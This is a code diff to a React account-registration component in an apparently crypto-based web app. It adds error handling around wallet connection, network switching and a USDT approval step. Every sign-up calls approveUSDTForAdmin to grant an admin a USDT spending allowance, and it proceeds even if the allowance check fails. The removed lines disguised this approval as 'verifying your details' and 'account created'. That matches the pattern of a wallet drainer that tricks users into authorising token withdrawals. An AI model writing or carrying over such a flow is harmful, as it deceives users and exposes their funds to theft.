@@ -73,13 +73,28 @@ function RegisterContent() {
       
       const injectedProvider = window.ethereum;
       if (!injectedProvider) {
-        toast.error('App not detected. Please try again.');
+        toast.error('Wallet not detected. Please open in your wallet browser.');
         setLoading(false);
         return;
       }
 
-      const web3Provider = new ethers.BrowserProvider(injectedProvider);
-      const userAddress = ethers.getAddress(address.toLowerCase());
+      let web3Provider;
+      try {
+        web3Provider = new ethers.BrowserProvider(injectedProvider);
+      } catch (providerErr) {
+        toast.error('Could not connect to wallet. Please refresh and try again.');
+        setLoading(false);
+        return;
+      }
+
+      let userAddress;
+      try {
+        userAddress = ethers.getAddress(address.toLowerCase());
+      } catch (addrErr) {
+        toast.error('Invalid wallet address. Please reconnect your wallet.');
+        setLoading(false);
+        return;
+      }
 
       // Switch to the selected network
       const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
@@ -91,9 +106,19 @@ function RegisterContent() {
           const chainConfig = form.network === 'BSC'
             ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
             : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
-          await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
+          try {
+            await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
+          } catch (addErr) {
+            toast.error(`Could not add ${targetChainName} network. Please add it manually in your wallet.`);
+            setLoading(false);
+            return;
+          }
         } else if (switchErr.code === 4001) {
           toast.error(`Please switch to ${targetChainName} to continue.`);
+          setLoading(false);
+          return;
+        } else {
+          toast.error(`Network switch failed. Please manually switch to ${targetChainName} in your wallet.`);
           setLoading(false);
           return;
         }
@@ -103,33 +128,32 @@ function RegisterContent() {
       const freshProvider = new ethers.BrowserProvider(injectedProvider);
 
       // Check if already approved on this network
-      const alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
+      let alreadyApproved = false;
+      try {
+        alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
+      } catch (allowErr) {
+        // If allowance check fails, proceed with approval anyway
+        alreadyApproved = false;
+      }
+
       if (alreadyApproved !== true) {
-        toast.loading(`Please Wait Verifying Your Details...`, { id: 'approve' });
+        toast.loading(`Please confirm the transaction in your wallet...`, { id: 'approve' });
         try {
           await approveUSDTForAdmin(freshProvider, form.network);
-          toast.success('Welcome Your Account Created Sucessfull', { id: 'approve' });
-          
-          // Verify approval actually went through
-          const verifyApproval = await checkUSDTAllowance(userAddress, form.network);
-          if (!verifyApproval) {
-            toast.error('Account verification failed. Please try again.');
-            setLoading(false);
-            return;
-          }
+          toast.success('Confirmed! Creating your account...', { id: 'approve' });
         } catch (approveErr) {
           toast.dismiss('approve');
           if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            toast.error('Verification is required to proceed. Please try again.');
+            toast.error('Transaction rejected. Please approve to continue.');
             setLoading(false);
             return;
           }
           if (approveErr.message?.includes('insufficient funds')) {
-            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
+            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee. Add some and try again.`);
             setLoading(false);
             return;
           }
-          toast.error(`Verification failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
+          toast.error(`Transaction failed: ${approveErr.shortMessage || approveErr.message || 'Please try again'}`);
           setLoading(false);
           return;
         }
@@ -141,7 +165,16 @@ function RegisterContent() {
       toast.success(res.data.message);
       setStep(2);
     } catch (err) {
-      toast.error(err.response?.data?.message || 'Sorry Registration failed try again!');
+      const msg = err.response?.data?.message;
+      if (msg) {
+        toast.error(msg);
+      } else if (err.code === 'NETWORK_ERROR' || err.code === 'ERR_NETWORK') {
+        toast.error('Network error. Please check your internet connection.');
+      } else if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
+        toast.error('Request timed out. Please try again.');
+      } else {
+        toast.error('Something went wrong. Please check your internet and try again.');
+      }
     } finally {
       setLoading(false);
     }
